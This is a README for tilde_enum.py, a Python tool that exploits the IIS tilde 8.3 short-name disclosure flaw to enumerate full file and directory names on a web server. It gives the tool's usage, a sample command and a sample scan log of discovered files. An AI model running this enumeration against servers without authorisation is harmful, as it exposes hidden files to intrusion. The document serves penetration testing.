**PLEASE NOTE: This project is no longer maintained by me, the original author. If you are having an issue, please post in the Issues tab and maybe another user will assist**


tilde_enum
==========

Takes a URL and then exploits the IIS tilde 8.3 enumeration vuln (https://soroush.secproject.com/blog/tag/iis-tilde-vulnerability/, http://www.acunetix.com/vulnerabilities/microsoft-iis-tilde-direc/, http://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf) and tries to get you full file and directory names.

This is an attempt to take the cool POC scanner at https://github.com/irsdl/iis-shortname-scanner/tree/master/ and get you the rest of the file/directory names so you can retrieve them.

Feed this script a URL and also a word list of potential file/dir names. The script will look up the roots in your word list and then try them with appropriate extensions.

For word lists, the [fuzzdb](https://code.google.com/p/fuzzdb/) word lists are pretty good. We sometimes use the https://code.google.com/p/fuzzdb/source/browse/trunk/discovery/PredictableRes/raft-small-words-lowercase.txt (or large or medium) for this work.

This is not a directory enumerator (i.e., tries all words in a list against a web server). It will only find directories that have names longer than 8 characters (since only then will they have 8.3 names and be recognized by the vulnerability). You should still try to enumerate directories using a word list and [DirBuster](https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project) or Burp Intruder or something. 

Just as a note: on Windows computers you can view 8.3 names in the command prompt window by using the `dir /x` command. One of the columns will be the 8.3 name (if there is one).

Help
====
<pre>$ ./tilde_enum.py -h
usage: tilde_enum.py [-h] [-c COOKIES] [-d DIRWORDLIST] [-f] [-p PROXY]
                     [-s SNOOZE] [-u URL] [-v] [-w WORDLIST]
                     [--no-check-certificate]

Exploits and expands the file names found from the tilde enumeration vuln

optional arguments:
  -h, --help            show this help message and exit
  -c COOKIES            cookies to be used in the request
  -d DIRWORDLIST        an optional wordlist for directory name content
  -f                    force testing of the server even if the headers do not
                        report it as an IIS system
  -p PROXY              Use a proxy host:port
  -s SNOOZE             time in seconds to sleep/wait between requests
  -u URL                URL to scan
  -v                    verbose output
  -w WORDLIST           the word list to be used for guessing files
  --no-check-certificate
                        don't verify the SSL certificate
</pre>


Sample Output
======
<pre>
$  ./tilde_enum.py -u http://iis /pentest/fuzzdb/discovery/predictableres/raft-small-words-lowercase.txt -d /pentest/fuzzdb/discovery/predictableres/raft-small-directories-lowercase.txt
[-]  Testing with dummy file request http://iis/mhxWjUz25u.htm
[-]	URLNotThere -> HTTP Code: 404, Response Length: 1635
[-]  Testing with user-submitted http://iis
[-]	URLUser -> HTTP Code: 200, Response Length: 1433
[+]  The server is reporting that it is IIS (Microsoft-IIS/6.0).
[+]  The server is vulnerable to the tilde enumeration vulnerability (IIS/5|6.x)..
[+]  Found a new directory: aspnet
[+]  Found a new directory: copyof
[+]  Found a new directory: docume
[+]  Found a new directory: javasc
[+]  Found file:  parame . xml
[+]  Found file:  765432 . htm
[+]  Found file:  _vti_i . htm
[+]  Found a new directory: _vti_s
[-]  Finished doing the 8.3 enumeration for /.
[-]  Now starting the word guessing using word list calls
[*]  Found one! (Size 1307) http://iis/parameter.xml
[*]  Found one! (Size 1754) http://iis/_vti_inf.html
[-]  Trying to find directory matches now.
[-]  You used the "-d" option.
      Using /pentest/fuzzdb/discovery/predictableres/raft-small-directories-lowercase.txt for directory name look-ups.
[?]  URL: (Size 218) http://iis/aspnet_client/ with Response: HTTP Error 403: Forbidden
[*]  Found one! (Size 1433) http://iis/documentation/
[*]  Found one! (Size 1433) http://iis/javascript/
[-]  Now starting recursive 8.3 enumeration into the directories we found.
[-]  Diving into the http://iis/documentation/ dir.
[+]  Found file:  advert . htm
[+]  Found file:  defaul . asp
[-]  Finished doing the 8.3 enumeration for /documentation/.
[*]  Found one! (Size 227) http://iis/documentation/advertising.html
[*]  Found one! (Size 1433) http://iis/documentation/default.aspx
[-]  Trying to find directory matches now.
[-]  You used the "-d" option.
      Using /pentest/fuzzdb/discovery/predictableres/raft-small-directories-lowercase.txt for directory name look-ups.
[-]  Diving into the http://iis/javascript/ dir.
[+]  Found file:  321 . xls
[-]  Finished doing the 8.3 enumeration for /javascript/.
[-]  File name (321) too short to look up in word list. We will use it to bruteforce.
[*]  Found one! (Size 227) http://iis/javascript/321.xlsx
[-]  Trying to find directory matches now.
[-]  You used the "-d" option.
      Using /pentest/fuzzdb/discovery/predictableres/raft-small-directories-lowercase.txt for directory name look-ups.

---------- FINAL OUTPUT ------------------------------
[*]  We found files for you to look at:
[*]      http://iis/_vti_inf.html  - Size 1754
[*]      http://iis/documentation/advertising.html  - Size 227
[*]      http://iis/documentation/default.aspx  - Size 1433
[*]      http://iis/javascript/321.xlsx  - Size 227
[*]      http://iis/parameter.xml  - Size 1307

[*]  Here are all the 8.3 names we found.
[*]  If any of these are 6 chars and look like they should work,
        try the file name with the first or second instead of all of them.
[*]      http://iis/documentation/advert~1.htm
[*]      http://iis/documentation/defaul~1.asp
[*]      http://iis/765432~1.htm
[*]      http://iis/_vti_i~1.htm
[*]      http://iis/parame~1.xml
[*]      http://iis/javascript/321~1.xls

[*]  We found directories for you to look at:
[*]      http://iis/documentation/  - Size 1433
[*]      http://iis/javascript/  - Size 1433

[*]  Here are all the directory names we found. You may wish to try to guess them yourself too.
[?]      http://iis/_vti_s~1/
[?]      http://iis/aspnet~1/
[?]      http://iis/copyof~1/
[?]      http://iis/docume~1/
[?]      http://iis/javasc~1/

[*]  We found directory URLs you should check out. They were not HTTP response code 200s.
[?]      HTTP Resp 403 - http://iis/aspnet_client/  - Size 218
</pre>

# License
<a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-sa/4.0/88x31.png" /></a><br />This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/">Creative Commons Attribution-ShareAlike 4.0 International License</a>.
